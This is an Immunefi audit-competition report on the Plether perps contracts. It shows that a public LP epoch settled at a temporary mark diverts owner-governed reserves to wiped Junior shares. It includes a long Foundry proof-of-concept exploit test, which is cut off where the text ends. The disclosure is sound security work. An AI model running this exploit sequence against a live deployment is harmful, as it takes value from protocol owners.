# \#99405 [SC-Medium] Public LP epoch diverts owner governed reserves into wiped Junior shares

**Submitted on Nov 13th 2026 at 14:28:54 UTC by @k42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99405
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description


A Junior holder can settle a refundable redemption epoch during a temporary, signed basket price move. Reconciliation permanently reduces `unassignedAssets` while no cash leaves Pool and no trader claim changes. When basket price returns, recovered value goes to wiped Junior shares instead of owner governed reserves. A matched Foundry test transfers 40.608664 USDG into Junior claim value and reduces a later owner directed receiver's actual claim by 40.607040 USDG. This is Medium protocol griefing, not a claim of stolen Senior principal or preexisting user yield.

## Vulnerability Details

`unassignedAssets` records accounted value without an LP claimant and blocks ordinary deposit activation. A fresh reconcile caps that bucket at current marked distributable value. A temporary trader gain can make marked distributable value smaller than stored `unassignedAssets`, writing a lower reserve balance to storage. Junior and Senior principal absorb marked loss before this cap touches owner governed value. On mark reversal, no source record restores prior reserve basis: `applyRevenueIntent` instead routes newly visible equity to Senior and then Junior. This reverses reserve priority without an owner assignment or claimant event. Mark reversal itself moves no cash; later close fees are identical across matched branches.

```solidity
// HousePoolReconcilePlanLib.sol:73-80
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;

if (plan.claimedEquityZero) {
    uint256 seededDistributableToClaims = snapshot.distributable > plan.state.unassignedAssets
        ? snapshot.distributable - plan.state.unassignedAssets
        : 0;
    HousePoolPendingPreviewLib.applyRevenueIntent(plan.state, seededDistributableToClaims);
    return plan;
}
```

PoC constructs reserve honestly. Eleven public winning LONG round trips, each held one hour over a 10% basket decline, gradually wipe Junior and impair Senior while both vaults retain shares. Owner contributes exactly measured Senior recovery gap through `CfdEngine.recapitalizePool`, without excess funding. Before next reconcile, five independent losing LONG round trips, each held one hour over a 10% basket rise, deliver Pool revenue. Fresh public Router mark updates precede each origin open and close; flat intervals between round trips last one hour. Revenue restores Senior, leaving 15,072.318211 USDG of already funded owner governed value in `unassignedAssets`. An ordinary Senior LP redeems, leaving 1.000219 USDG of seed Senior principal; reserve remains unchanged. An attacker controlled original Junior wallet transfers shares with zero current withdrawable NAV to a fresh attack wallet. A preexisting Junior holder could execute later public epoch directly; transfer only separates historical LP ownership from attack wallet in PoC. No new shares can be minted while reserve blocks deposits.

Attacker opens a 5,000 unit LONG at a 1e8 mark. A 0.99e8 six feed mark gives that position a temporary gain. At a matured Junior epoch, attacker invokes public `OrderRouter.settleLpEpoch` with those signed feeds. Its redeem request has zero value and is refunded, so attacker retains shares. Reconcile sets both tranche principals to zero and reduces `unassignedAssets` without moving Pool cash, changing trader claims, consuming pending claimant buckets, or reducing Senior high water mark.

Control ingests same authenticated 0.99e8 mark at same time through public `updateMarkPrice`, but has no low mark LP epoch. Both branches return to 1e8, close same trader position, then perform actual Junior claim and owner assignment plus recipient claim at matched times. Trader terminal wallet, Clearinghouse balance, and aggregate claims match. Difference is attacker forced reconcile while temporary mark was low.

Source based ownership matters: price repricing cannot turn owner governed funds into Junior owned revenue merely because a reversible, unrealized trader gain temporarily consumed marked equity. A checked in bootstrap test covers owner assignment *at* an adverse mark, not a public third party epoch followed by full mark reversal before owner assignment. Cecuro MED 12 covers same batch pending recapitalization and revenue; MED 26 accepts trading against ownerless value after activation; LOW 65 covers initial seed capture. None describes permanent reserve loss on a reversible mark with unchanged cash and claims. This distinct root remains subject to judging.

## Impact Details

**Medium: Griefing.** At identical final price, time, trader balances, and owner funding, attack epoch causes 40.608664 USDG of additional Junior payout. A later owner assignment to a designated receiver produces 40.607040 USDG less actual token receipt. Report claims measured receiver shortfall, not remaining 0.001624 USDG difference. Pool cash plus Junior receipt is equal across branches before owner assignment. After share transfer, attack wallet plus attack trader start with 10,000 USDG; attack ends at 10,038.158649 USDG including trader costs, while control ends at 9,997.549985 USDG. This post transfer measure excludes original wallet's historical 25,000 USDG Junior loss and does not claim full lifecycle profit. Incremental diversion and recipient damage, not a free share purchase premise, support selected griefing impact.

| Terminal measure | Control | Attack |
| --- | ---: | ---: |
| Attacker Junior USDG claim | 1.983999 | 42.592663 |
| Owner governed reserve before assignment | 15,072.318211 | 15,031.709547 |
| Owner directed receiver USDG claim | 15,072.068222 | 15,031.461182 |
| Attack wallet plus trader wealth after transfer | 9,997.549985 | 10,038.158649 |

Owner governed value lacks a preexisting user claimant. Accordingly, this report does not select Critical user fund theft, High unclaimed yield theft, insolvency, or a fund freeze. Its accepted row is protocol griefing through loss of owner allocation control. Setup uses sixteen 10% basket movements with one hour holds and gaps to create an impaired historical Pool state and honest reserve; it does not claim such volatility is common. Exploitable mark move is 1% and fully reverses. PoC asserts zero current withdrawable NAV before transfer; no market price or full lifecycle return for original Junior capital is claimed.

## References

- [Competition scope, Medium griefing, and PoC rules](https://immunefi.com/audit-competition/plether/scope/)
- [Competition information and pinned revision](https://immunefi.com/audit-competition/plether/information/)
- [Unassigned reserve cap and claimant seeding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L61-L89)
- [Public Router atomic mark and epoch settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L486)
- [Public LP settlement and reconciliation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L835)
- [Storage write of reduced reserve](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1599)
- [Revenue routing to Senior then Junior](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L150-L187)
- [Exact owner recapitalization](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L627-L658)
- [Owner assignment of unassigned value](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L655-L703)
- [Ownership and quarantine rules](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L308-L327)
- [Claimant inflow source semantics](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L628-L652)
- [Public Cecuro report for root comparison](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)


## Proof of Concept

## Proof of Concept

At pinned commit, save full Solidity code below as `packages/perps/test/perps/poc/M02TimeCompressedProbe.t.sol`. Run from `packages/perps`:

```bash
forge test --match-path test/perps/poc/M02TimeCompressedProbe.t.sol -vv
```

Production Router, Engine, Pool, Clearinghouse, and Vault contracts remain unchanged. Test token and Pyth transport are deterministic out of scope mocks. Oracle update has six coherent feeds. Origin trades use public fresh mark updates and one hour holding periods. Release risk configuration uses 40% skew, nonzero VPI, and 80% Senior cap. Decisive output uses six decimal USDG atoms:

```text
[PASS] test_HonestRecapOwnerlessAssetsShiftOnOnePercentMark()
honest_unassigned: 15072318211
senior_after_exit: 1000219
unassigned_after_senior_exit: 15072318211
control_attacker_receipt: 1983999
attack_attacker_receipt: 42592663
control_unassigned: 15072318211
attack_unassigned: 15031709547
control_owner_receiver_receipt: 15072068222
attack_owner_receiver_receipt: 15031461182
attacker_initial_wealth: 10000000000
control_attacker_total_wealth: 9997549985
attack_attacker_total_wealth: 10038158649
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Full standalone Foundry test:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAccountLens} from "@plether/perps/CfdEngineAccountLens.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineProtocolLens} from "@plether/perps/CfdEngineProtocolLens.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterAdmin} from "@plether/perps/OrderRouterAdmin.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {
    OrderRouterLiquidationBatchSidecar
} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PerpsPublicLens} from "@plether/perps/PerpsPublicLens.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {MockToken} from "@plether/test-utils/MockToken.sol";
import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";

/// @dev Perps fixture using freely mintable collateral with six decimals.
contract MockSettlementToken is MockToken {

    constructor() MockToken("Settlement Token", "SETTLEMENT", 6) {}

}

abstract contract BasePerpTest is Test {

    MockSettlementToken settlementToken;
    CfdEngine engine;
    TerminalNavBookV2 terminalNavBook;
    CfdEngineAdmin engineAdmin;
    CfdEngineAccountLens engineAccountLens;
    CfdEngineLens engineLens;
    CfdEngineProtocolLens engineProtocolLens;
    HousePool pool;
    HousePoolRedemptionMathSidecar housePoolRedemptionMathSidecar;
    MarginClearinghouse clearinghouse;
    TrancheVault seniorVault;
    TrancheVault juniorVault;
    OrderRouter router;
    CfdOrderPolicyEvaluator policyEvaluator;
    OrderRouterExecutionSidecar orderExecutionSidecar;
    OrderRouterAdmin routerAdmin;
    PletherOracle pletherOracle;
    PerpsPublicLens publicLens;
    MockPyth baseMockPyth;

    /// @dev Monday 2024-03-04 10:00 UTC. Avoids FAD window.
    uint256 constant SETUP_TIMESTAMP = 1_709_532_000;
    uint256 constant CAP_PRICE = 2e8;
    uint256 constant FROZEN_CLOSE_SPREAD_BPS = 50;
    uint256 internal constant TEST_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant TEST_MAX_SENIOR_SHARE_BPS = 8000;
    address internal constant PROTOCOL_TREASURY_ACCOUNT = address(0xFEE50001);

    receive() external payable {}

    function setUp() public virtual {
        settlementToken = new MockSettlementToken();
        clearinghouse = new MarginClearinghouse(address(settlementToken));

        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        terminalNavBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalNavBook));
        engineAccountLens = new CfdEngineAccountLens(address(engine));
        engineLens = new CfdEngineLens(address(engine));
        engineProtocolLens = new CfdEngineProtocolLens(address(engine));
        housePoolRedemptionMathSidecar = new HousePoolRedemptionMathSidecar();
        pool = new HousePool(
            address(settlementToken), address(engine), address(housePoolRedemptionMathSidecar)
        );
        baseMockPyth = new MockPyth();
        baseMockPyth.setSynchronizeLegacyUniquePrices(true);
        bytes32[] memory baseFeedIds = _basePythFeedIds();
        uint256[] memory initialRaw = _releaseRawPrices(1e8);
        for (uint256 i; i < baseFeedIds.length; ++i) {
            baseMockPyth.setPrice(
                baseFeedIds[i],
                SafeCast.toInt64(SafeCast.toInt256(initialRaw[i])),
                int32(-8),
                SETUP_TIMESTAMP
            );
        }

        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)),
            address(pool),
            true,
            "Plether Senior LP",
            "seniorAssets",
            0,
            address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)),
            address(pool),
            false,
            "Plether Junior LP",
            "juniorAssets",
            0,
            address(0)
        );

        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        pletherOracle = new PletherOracle(
            address(engine),
            address(pool),
            address(baseMockPyth),
            baseFeedIds,
            _basePythWeights(),
            _basePythBasePrices(),
            _basePythInversions()
        );
        router = _deployOrderRouter(
            address(engine), address(engineLens), address(pool), address(pletherOracle)
        );
        _syncRouterAdmin();
        engine.setOrderRouter(address(router));
        publicLens = new PerpsPublicLens(
            address(engineAccountLens), address(engine), address(router), address(pool)
        );

        _bypassAllTimelocks();

        uint256 juniorSeed = _initialJuniorSeedDeposit();
        if (juniorSeed > 0) {
            settlementToken.mint(address(this), juniorSeed);
            settlementToken.approve(address(pool), juniorSeed);
            pool.initializeSeedPosition(false, juniorSeed, _juniorSeedReceiver());
        }

        uint256 seniorSeed = _initialSeniorSeedDeposit();
        if (seniorSeed > 0) {
            settlementToken.mint(address(this), seniorSeed);
            settlementToken.approve(address(pool), seniorSeed);
            pool.initializeSeedPosition(true, seniorSeed, _seniorSeedReceiver());
        }

        if (_autoActivateTrading() && pool.isSeedLifecycleComplete()) {
            pool.activateTrading();
        }

        uint256 junior = _initialJuniorDeposit();
        if (junior > 0) {
            _fundJunior(address(this), junior);
        }

        uint256 senior = _initialSeniorDeposit();
        if (senior > 0) {
            _fundSenior(address(this), senior);
        }
    }

    function _bypassAllTimelocks() internal {
        clearinghouse.setEngine(address(engine));

        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = TEST_MAX_SENIOR_EXPOSURE_ASSETS;
        config.maxSeniorShareBps = TEST_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        vm.warp(SETUP_TIMESTAMP);
    }

    // --- Virtual hooks ---

    function _riskParams() internal pure virtual returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: ((100) * 15) / 10,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual returns (uint256) {
        return 1_000_000 * 1e6;
    }

    function _initialSeniorDeposit() internal pure virtual returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual returns (uint256) {
        return 1000e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual returns (uint256) {
        return 1000e6;
    }

    function _juniorSeedReceiver() internal view virtual returns (address) {
        return address(this);
    }

    function _autoActivateTrading() internal pure virtual returns (bool) {
        return true;
    }

    function _seniorSeedReceiver() internal view virtual returns (address) {
        return address(this);
    }

    function _basePythFeedIds() internal pure returns (bytes32[] memory feedIds) {
        feedIds = new bytes32[](6);
        feedIds[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        feedIds[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        feedIds[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        feedIds[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        feedIds[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        feedIds[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _basePythWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _basePythBasePrices() internal pure returns (uint256[] memory basePrices) {
        basePrices = new uint256[](6);
        basePrices[0] = 117_500_000;
        basePrices[1] = 638_000;
        basePrices[2] = 134_480_000;
        basePrices[3] = 72_880_000;
        basePrices[4] = 10_860_000;
        basePrices[5] = 126_100_000;
    }

    function _basePythInversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
    }

    function _releaseRawPrices(
        uint256 mark
    ) internal pure returns (uint256[] memory rawPrices) {
        uint256[] memory bases = _basePythBasePrices();
        bool[] memory inversions = _basePythInversions();
        rawPrices = new uint256[](bases.length);
        for (uint256 i; i < bases.length; ++i) {
            uint256 normalized = bases[i] * mark / 1e8;
            rawPrices[i] = inversions[i] ? (1e16 + normalized / 2) / normalized : normalized;
        }
    }

    function _mockPythUpdateData() internal returns (bytes[] memory updateData) {
        return _mockPythUpdateData(1e8);
    }

    function _mockPythUpdateData(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        bytes32[] memory feedIds = _basePythFeedIds();
        uint256[] memory rawPrices = _releaseRawPrices(price);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: SafeCast.toInt64(SafeCast.toInt256(rawPrices[i])),
                    conf: SafeCast.toUint64(rawPrices[i] / 10_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime == 0 ? 0 : publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _mockPythCurrentUpdateData(
        uint256 mark
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = block.timestamp;
        bytes32[] memory feedIds = _basePythFeedIds();
        uint256[] memory rawPrices = _releaseRawPrices(mark);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: SafeCast.toInt64(SafeCast.toInt256(rawPrices[i])),
                    conf: SafeCast.toUint64(rawPrices[i] / 10_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _mockHistoricalPublishTime() internal view returns (uint256 publishTime) {
        publishTime = vm.getBlockTimestamp();
        uint64 nextOrderId = router.nextExecuteId();
        if (nextOrderId == 0) {
            return publishTime;
        }

        (IOrderRouterAccounting.PendingOrderView memory pending,) =
            router.getPendingOrderView(nextOrderId);
        uint256 candidate = uint256(pending.commitTime) + 1;
        if (pending.orderId != 0 && candidate <= publishTime) {
            publishTime = candidate;
        }
    }

    // --- Asynchronous LP funding helpers ---

    function _fundJunior(
        address lp,
        uint256 amount
    ) internal {
        _fundTrancheAsync(juniorVault, lp, amount);
    }

    function _fundSenior(
        address lp,
        uint256 amount
    ) internal {
        _fundTrancheAsync(seniorVault, lp, amount);
    }

    function _fundTrancheAsync(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();

        uint256 activationTime = vault.depositEpochStart(requestId);
        if (block.timestamp < activationTime) {
            vm.warp(activationTime);
        }
        uint256 markPrice = engine.lastMarkPrice();
        bytes[] memory updateData = _mockPythCurrentUpdateData(markPrice == 0 ? 1e8 : markPrice);
        vm.prank(address(0xE0E));
        router.updateMarkPrice(updateData);
        vm.prank(lp);
        pool.settleLpEpoch(0, 0);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, amount, "async funding must finalize requested asset basis");
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimableAssets, lp, lp);
        assertGt(shares, 0, "async tranche funding must mint claimable shares");
    }

    function _fundTrader(
        address trader,
        uint256 amount
    ) internal {
        address account = trader;
        settlementToken.mint(trader, amount);
        vm.startPrank(trader);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _currentPoolConfig() internal view returns (IHousePool.PoolConfig memory config) {
        config = IHousePool.PoolConfig({
            seniorRateBps: pool.seniorRateBps(),
            markStalenessLimit: pool.markStalenessLimit(),
            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
            maxSeniorExposureAssets: pool.maxSeniorExposureAssets(),
            maxSeniorShareBps: pool.maxSeniorShareBps()
        });
    }

    function _setSeniorCapacity(
        uint256 maxSeniorExposureAssets,
        uint256 maxSeniorShareBps
    ) internal {
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = maxSeniorExposureAssets;
        config.maxSeniorShareBps = maxSeniorShareBps;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    // --- Trading helpers ---

    // --- Governance helpers ---

    function _syncEngineAdmin() internal {
        engineAdmin = CfdEngineAdmin(engine.admin());
    }

    function _deployEngine(
        CfdTypes.RiskParams memory riskParams_
    ) internal returns (CfdEngine deployedEngine) {
        deployedEngine = new CfdEngine(
            address(settlementToken),
            address(clearinghouse),
            CAP_PRICE,
            riskParams_,
            _frozenCloseSpreadBps()
        );
        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement =
            new CfdEngineSettlementSidecar(address(deployedEngine));
        CfdEngineAdmin adminModule = new CfdEngineAdmin(address(deployedEngine), address(this));
        deployedEngine.setDependencies(address(planner), address(settlement), address(adminModule));
        deployedEngine.setProtocolTreasury(PROTOCOL_TREASURY_ACCOUNT);
    }

    function _deployOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal virtual returns (OrderRouter deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter =
            vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar =
            new OrderRouterLiquidationBatchSidecar(predictedRouter);
        deployedRouter = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(deployedRouter), predictedRouter);
    }

    function _frozenCloseSpreadBps() internal pure virtual returns (uint256) {
        return FROZEN_CLOSE_SPREAD_BPS;
    }

    function _syncRouterAdmin() internal {
        routerAdmin = OrderRouterAdmin(router.admin());
    }

    // --- Time helpers ---


}

contract M02TimeCompressedProbe is BasePerpTest {

    address internal constant ATTACKER = address(0xBAD);
    address internal constant ORIGINAL_JUNIOR = address(0xC0FFEE);
    address internal constant SENIOR_LP = address(0xA1A1);
    address internal constant WINNER = address(0xA11CE);
    address internal constant LOSER = address(0xB0B);
    address internal constant ATTACK_TRADER = address(0xBEEF);
    address internal constant OWNER_RECEIVER = address(0x3333);

    struct Branch {
        uint256 attackerReceipt;
        uint256 ownerReceiverReceipt;
        uint256 unassignedBeforeAssignment;
        uint256 traderBalance;
        uint256 traderWallet;
        uint256 traderClaims;
        uint256 poolCashBeforeAssignment;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.minBountyAssets = 1e6;
    }

    function test_HonestRecapOwnerlessAssetsShiftOnOnePercentMark() public {
        _establishHonestUnassigned();
        _fundTrader(ATTACK_TRADER, 10_000e6);
        router.updateMarkPrice(_mockPythCurrentUpdateData(1e8));
        uint256 attackerBaselineWealth = settlementToken.balanceOf(ATTACKER)
            + settlementToken.balanceOf(ATTACK_TRADER) + clearinghouse.balanceAssets(ATTACK_TRADER);
        _trade(ATTACK_TRADER, CfdTypes.Side.LONG, 5000e18, 1000e6, 1e8, false);
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
        assertGt(attackerShares, 0, "zero NAV shares acquired");
        _finishCooldown(juniorVault, ATTACKER);
        (uint256 lowEpoch,) = juniorVault.getRequestEpochWindow();
        uint256 lowTime = pool.lpEpochStart(lowEpoch);
        uint256 finalTime = lowTime + 4 hours;
        uint256 checkpoint = vm.snapshotState();

        vm.warp(lowTime);
        router.updateMarkPrice(_mockPythCurrentUpdateData(99_000_000));
        Branch memory control = _finishBranch(finalTime);
        assertTrue(vm.revertToState(checkpoint));
        uint256 cashBeforeLow = pool.rawAssets();
        uint256 claimsBeforeLow = engine.totalTraderClaimBalanceAssets();
        uint256 hwmBeforeLow = pool.seniorHighWaterMark();
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.pendingTradingRevenueAssets(), 0);
        vm.prank(ATTACKER);
        uint256 lowId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        assertEq(pool.lpEpochStart(lowId), lowTime);
        vm.warp(lowTime);
        router.settleLpEpoch(_mockPythCurrentUpdateData(99_000_000));
        assertEq(pool.rawAssets(), cashBeforeLow, "mark settlement moves no cash");
        assertEq(engine.totalTraderClaimBalanceAssets(), claimsBeforeLow, "no claim change");
        assertGe(pool.seniorHighWaterMark(), hwmBeforeLow, "no watermark reset");
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.pendingTradingRevenueAssets(), 0);
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        vm.prank(ATTACKER);
        juniorVault.claimRedeemRefund(lowId, ATTACKER, ATTACKER);

        Branch memory attack = _finishBranch(finalTime);
        emit log_named_uint("control_attacker_receipt", control.attackerReceipt);
        emit log_named_uint("attack_attacker_receipt", attack.attackerReceipt);
        emit log_named_uint("control_unassigned", control.unassignedBeforeAssignment);
        emit log_named_uint("attack_unassigned", attack.unassignedBeforeAssignment);
        emit log_named_uint("control_owner_receiver_receipt", control.ownerReceiverReceipt);
        emit log_named_uint("attack_owner_receiver_receipt", attack.ownerReceiverReceipt);
        uint256 controlWealth =
            control.attackerReceipt + control.traderBalance + control.traderWallet;
        uint256 attackWealth = attack.attackerReceipt + attack.traderBalance + attack.traderWallet;
        emit log_named_uint("attacker_initial_wealth", attackerBaselineWealth);
        emit log_named_uint("control_attacker_total_wealth", controlWealth);
        emit log_named_uint("attack_attacker_total_wealth", attackWealth);
        assertGt(attackWealth, attackerBaselineWealth, "attack nets assets after trader costs");
        assertGt(attackWealth, controlWealth, "extra epoch raises combined wealth");
        assertGt(attack.attackerReceipt, control.attackerReceipt);
        assertGt(control.ownerReceiverReceipt, attack.ownerReceiverReceipt);
        assertLt(attack.unassignedBeforeAssignment, control.unassignedBeforeAssignment);
        assertEq(attack.traderBalance, control.traderBalance);
        assertEq(attack.traderWallet, control.traderWallet);
        assertEq(attack.traderClaims, control.traderClaims);
        assertEq(
            attack.poolCashBeforeAssignment + attack.attackerReceipt,
            control.poolCashBeforeAssignment + control.attackerReceipt
        );
    }

    function _establishHonestUnassigned() private {
        _fundJunior(ORIGINAL_JUNIOR, 25_000e6);
        _fundSenior(SENIOR_LP, 100_000e6);
        _fundTrader(WINNER, 100_000e6);
        for (uint256 i; i < 11; ++i) {
            router.updateMarkPrice(_mockPythCurrentUpdateData(1e8));
            uint256 size = (pool.rawAssets() * 38 / 100 / 1e8) * 1e20;
            _trade(WINNER, CfdTypes.Side.LONG, size, 5000e6, 1e8, false);
            vm.warp(block.timestamp + 1 hours);
            router.updateMarkPrice(_mockPythCurrentUpdateData(90_000_000));
            _trade(WINNER, CfdTypes.Side.LONG, size, 0, 90_000_000, true);
            if (i < 10) {
                vm.warp(block.timestamp + 1 hours);
            }
        }
        _finishCooldown(juniorVault, ORIGINAL_JUNIOR);
